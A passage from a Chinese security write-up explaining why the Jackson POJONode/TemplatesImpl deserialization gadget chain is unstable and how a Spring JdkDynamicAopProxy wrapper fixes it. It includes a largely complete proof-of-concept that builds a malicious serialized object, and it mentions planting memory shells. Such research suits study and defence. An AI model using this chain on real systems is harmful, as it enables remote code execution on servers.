</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">POJONode</span><span class="w"> </span><span class="n">jsonNodes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">POJONode</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BadAttributeValueExpException</span><span class="w"> </span><span class="n">badAttributeValueExpException</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">BadAttributeValueExpException</span><span class="p">(</span><span class="n">111</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">badAttributeValueExpException</span><span class="p">,</span><span class="s">&#34;val&#34;</span><span class="p">,</span><span class="n">jsonNodes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">badAttributeValueExpException</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 从文件中反序列化对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFiled</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">values</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">templates</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="n">values</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>网上说这个不稳定，本地试了10次都没问题，就先不看</p>
<h2 id="存档1-basejsonnode">存档1 BaseJsonNode<a hidden class="anchor" aria-hidden="true" href="#存档1-basejsonnode">#</a></h2>
<p>为什么本地重写<code>BaseJsonNode</code>可以解决问题1</p>
<h1 id="0x04-不稳定">0x04 不稳定<a hidden class="anchor" aria-hidden="true" href="#0x04-不稳定">#</a></h1>
<p>之前说一直没遇到hhh，后面打内存马的时候出现了好几次这个问题，所以来补下这个坑。因为这个是概率触发，所以不太好截图</p>
<p>产生的原因呢是在<code>jackson自己的序列化中</code>，看到<code>serializeFields()</code></p>
<p>这里是for循环，props是之前赋值的，然后根据<code>filed的名字</code>调用去获取对应的值，这里后面就是调用<code>对应的getter</code>或者反射获取<code>filed值</code>了，问题就出在这个props值的顺序上，如果第一个值是<code>outputProperties</code>，最先调用的就是<code>getOutputProperties()</code>自然就可以调用成功。</p>
<p>但是如果是其他值就会有问题，这里值分别是<code>stylesheetDOM</code>，<code>transletIndex</code></p>
<p><img loading="lazy" src="../images/image-20241126101518613.png" alt="image-20241126101518613"  />
</p>
<p>这两个值对应两个getter方法<code>getStylesheetDOM()</code>,<code>getTransletIndex()</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">DOM</span><span class="w"> </span><span class="nf">getStylesheetDOM</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">DOM</span><span class="p">)</span><span class="n">_sdom</span><span class="p">.</span><span class="na">get</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getTransletIndex</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_class</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="n">defineTransletClasses</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">TransformerConfigurationException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Falls through</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">_transletIndex</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>如果先<code>getTransletIndex()</code>再<code>getOutputProperties()</code>也没事，<code>getTransletIndex()</code>只是帮忙<code>加载了字节码</code>，不会照成影响。</p>
<blockquote>
<p><strong>有问题只有一种场景</strong>，<code>getStylesheetDOM</code>在<code>getOutputProperties</code>前面调用</p>
<p>这个时候会在恶意类实例化前调用<code>getStylesheetDOM()</code>，而<code>_sdom</code>是<code>null</code>，会报<code>空指针</code>的错误</p>
</blockquote>
<p>那很简单呀我们给他赋予一个值不就行了，其实不能wwwww</p>
<p>我们看到<code>TemplatesImpl</code>其实会给这个赋予一个<code>ThreadLocal</code>实例，那为什么是<code>null</code>呢</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kd">transient</span><span class="w"> </span><span class="n">ThreadLocal</span><span class="w"> </span><span class="n">_sdom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ThreadLocal</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></div><p>这里是<code>反序列化</code>嘛，问题可能就出在这里</p>
<p>可以看到<code>TemplatesImpl</code>这里是不会序列化<code>_sdom</code>这个值的，同时反序列化的地方也不会赋值这个filed，所以他是<code>null</code></p>
<p><img loading="lazy" src="../images/image-20241126104503286.png" alt="image-20241126104503286"  />
</p>
<h3 id="解决">解决<a hidden class="anchor" aria-hidden="true" href="#解决">#</a></h3>
<p>但是我们不难想到<code>getOutputProperties</code>是继承的<code>Templates</code>接口，他只有这一个<code>getter</code>呀，能不能换成他呢（这里试过类型转换，没用）</p>
<blockquote>
<p><strong>解决办法是用到<code>动态代理</code></strong>，然后代理<code>Templates</code>接口，使得<code>props</code>只有<code>getOutputProperties</code>这个方法，<code>Proxy</code>调用<code>getOutputProperties()</code>,触发代理调用invoke方法，如果这个代理类invoke方法可以设置我们的<code>TemplatesImpl</code>对象来调用<code>getOutputProperties()</code>问题就解决了</p>
</blockquote>
<p>这里需要补充点东西，我们知道序列化会调用getter，之前分析流程可能不够细</p>
<p>jackson的初始化，最初会在<code>AnnotatedMethodCollector.java#_addMemberMethods</code>，找到类所有方法并put</p>
<p><img loading="lazy" src="../images/image-20241126172654114.png" alt="image-20241126172654114"  />
</p>
<blockquote>
<p>这里是获取代理的方法，最终其实是通过反射<code>getDeclaredMethods()</code>获取的，但是其获取方法得到的<code>顺序</code>每次可能存在一些<code>偏差</code>，<code>这也是jackson链子不稳定的原因</code></p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Method</span><span class="o">[]</span><span class="w"> </span><span class="nf">getClassMethods</span><span class="p">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">cls</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">cls</span><span class="p">.</span><span class="na">getDeclaredMethods</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20241126173030787.png" alt="image-20241126173030787"  />
</p>
<p>一共是5个方法，分别是<code>hashcode</code>,<code>equals</code>,<code>toString</code>,<code>getOutputProperties</code>,<code>newTransformer</code></p>
<blockquote>
<p>这里我们用java的反射 <strong><code>getDeclaredMethods</code> 方法去获取<code>代理类所有方法时</code>也是根据我们提供的<code>接口</code>（这里是<code>Templates.class</code>）去获取的方法</strong>。，所以只有上面5个方法，其他3个方法自带的都会有，然后getter就只有<code>getOutputProperties</code></p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Object</span><span class="w"> </span><span class="n">proxyObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">clazz</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>然后将获取的方法返回，这里会尝试添加到props里，只有<code>getOutputProperties</code>添加了</p>
<p><img loading="lazy" src="../images/image-20241126175407133.png" alt="image-20241126175407133"  />
</p>
<p><img loading="lazy" src="../images/image-20241126175703650.png" alt="image-20241126175703650"  />
</p>
<p>然后后面其他的赋值就只有<code>getOutputProperties</code>这一个getter方法了</p>
<h1 id="0x05-jdkdynamicaopproxy">0x05 JdkDynamicAopProxy<a hidden class="anchor" aria-hidden="true" href="#0x05-jdkdynamicaopproxy">#</a></h1>
<p><code>org.springframework.aop.framework.JdkDynamicAopProxy</code>需要aop依赖</p>
<p>这个类有啥用呢，通过前面的处理可以只调用<code>getOutputProperties()</code>，调用后触发代理类<code>invoke()</code>方法，其中在<code>invokeJoinpointUsingReflection()</code>处会反射调用对应的方法（getOutputProperties）</p>
<p><img loading="lazy" src="../images/image-20241126185216356.png" alt="image-20241126185216356"  />
</p>
<p><img loading="lazy" src="../images/image-20241126185301193.png" alt="image-20241126185301193"  />
</p>
<p>我这里缩减下代码，我们需要控制这里<code>target</code>，<code>target</code>来自<code>targetSource</code>，<code>targetSource</code>有来初始化设置的<code>this.advised</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">TargetSource</span><span class="w"> </span><span class="n">targetSource</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">advised</span><span class="p">.</span><span class="na">targetSource</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">targetSource</span><span class="p">.</span><span class="na">getTarget</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20241126185534951.png" alt="image-20241126185534951"  />
</p>
<p>这里我们将<code>TemplatesImpl</code>进行<code>AdvisedSupport</code>封装放入对应的值，反射时就能调用到我们放入的<code>TemplatesImpl</code>对象</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">cons</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">AdvisedSupport</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cons</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AdvisedSupport</span><span class="w"> </span><span class="n">advisedSupport</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AdvisedSupport</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">advisedSupport</span><span class="p">.</span><span class="na">setTarget</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">cons</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">advisedSupport</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">proxyObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">clazz</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">POJONode</span><span class="w"> </span><span class="n">jsonNodes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">POJONode</span><span class="p">(</span><span class="n">proxyObj</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><h1 id="0x06-poc">0x06 poc<a hidden class="anchor" aria-hidden="true" href="#0x06-poc">#</a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">jackson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.fasterxml.jackson.databind.node.POJONode</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.tomcat.util.codec.binary.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.framework.AdvisedSupport</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.management.BadAttributeValueExpException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.TransformerConfigurationException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.security.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Properties</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">jackson</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazzs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Evil</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazzs</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//System.out.println(Base64.getEncoder().encodeToString(code));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">cons</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">AdvisedSupport</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cons</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AdvisedSupport</span><span class="w"> </span><span class="n">advisedSupport</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AdvisedSupport</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">advisedSupport</span><span class="p">.</span><span class="na">setTarget</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">cons</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">advisedSupport</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">proxyObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">clazz</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">POJONode</span><span class="w"> </span><span class="n">jsonNodes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">POJONode</span><span class="p">(</span><span class="n">proxyObj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BadAttributeValueExpException</span><span class="w"> </span><span class="n">badAttributeValueExpException</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">BadAttributeValueExpException</span><span class="p">(</span><span class="n">111</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">badAttributeValueExpException</span><span class="p">,</span><span class="s">&#34;val&#34;</span><span class="p">,</span><span class="n">jsonNodes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 生成私钥和公钥</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">KeyPairGenerator</span><span class="w"> </span><span class="n">keyPairGen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KeyPairGenerator</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;RSA&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">keyPairGen</span><span class="p">.</span><span class="na">initialize</span><span class="p">(</span><span class="n">2048</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">KeyPair</span><span class="w"> </span><span class="n">keyPair</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">keyPairGen</span><span class="p">.</span><span class="na">generateKeyPair</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PrivateKey</span><span class="w"> </span><span class="n">privateKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">keyPair</span><span class="p">.</span><span class="na">getPrivate</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 创建签名引擎</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Signature</span><span class="w"> </span><span class="n">signingEngine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Signature</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;SHA256withRSA&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">signingEngine</span><span class="p">.</span><span class="na">initSign</span><span class="p">(</span><span class="n">privateKey</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
